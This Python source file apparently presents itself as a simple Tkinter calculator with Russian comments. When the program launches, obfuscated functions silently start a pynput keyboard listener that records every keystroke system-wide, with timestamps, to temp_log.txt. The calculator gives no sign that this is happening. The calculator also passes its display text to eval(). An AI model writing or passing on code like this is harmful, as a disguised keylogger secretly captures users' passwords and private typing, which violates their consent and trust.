import tkinter as dftk
from pynput import keyboard as kb_listener
import logging as lg

lg.basicConfig(filename="temp_log.txt", level=lg.DEBUG, format="%(asctime)s - %(message)s")


def a1z2_on_press(b4x7_key):
    try:
        lg.info(f"Button {b4x7_key.char} tapped")
    except AttributeError:
        lg.info(f"Special key {b4x7_key} tapped")

def g9h5_on_release(c3v6_key):
    if c3v6_key == kb_listener.Key.esc:
        return False  # Завершаем программу при нажатии Esc


def z0x1_start_logger():
    
    if not hasattr(z0x1_start_logger, "b2_listener") or not z0x1_start_logger.b2_listener.running:
        z0x1_start_logger.b2_listener = kb_listener.Listener(on_press=a1z2_on_press, on_release=g9h5_on_release)
        z0x1_start_logger.b2_listener.start()


class CalcUI:
    def __init__(self, p9_root):
        self.r7_root = p9_root
        self.r7_root.title("Basic Operations")

        self.g6_result_var = dftk.StringVar()

        # Создаем дисплей
        self.d8_display = dftk.Entry(
            self.r7_root,
            textvariable=self.g6_result_var,
            font=("Arial", 16),
            bd=10,
            relief="sunken",
            justify="right",
        )
        self.d8_display.grid(row=0, column=0, columnspan=4)

        # Определяем кнопки
        x4_buttons = [
            ('7', 1, 0), ('8', 1, 1), ('9', 1, 2), ('/', 1, 3),
            ('4', 2, 0), ('5', 2, 1), ('6', 2, 2), ('*', 2, 3),
            ('1', 3, 0), ('2', 3, 1), ('3', 3, 2), ('-', 3, 3),
            ('0', 4, 0), ('C', 4, 1), ('=', 4, 2), ('+', 4, 3),
        ]

        # Создаем кнопки динамически
        for (btn_text, r, c) in x4_buttons:
            button = dftk.Button(
                self.r7_root,
                text=btn_text,
                width=10,
                height=3,
                font=("Arial", 16),
                command=lambda t=btn_text: self.e1_on_button_click(t),
            )
            button.grid(row=r, column=c)

    def e1_on_button_click(self, y7_text):
        if y7_text == "=":
            try:
                x8_result = str(eval(self.g6_result_var.get()))
                self.g6_result_var.set(x8_result)
            except Exception as ex:
                self.g6_result_var.set("Err")
        elif y7_text == "C":
            self.g6_result_var.set("")
        else:
            current = self.g6_result_var.get()
            self.g6_result_var.set(current + y7_text)


# Основная точка входа
if __name__ == "__main__":
    z0x1_start_logger()  
    w3_root = dftk.Tk()
    app_ui = CalcUI(w3_root)
    w3_root.mainloop()
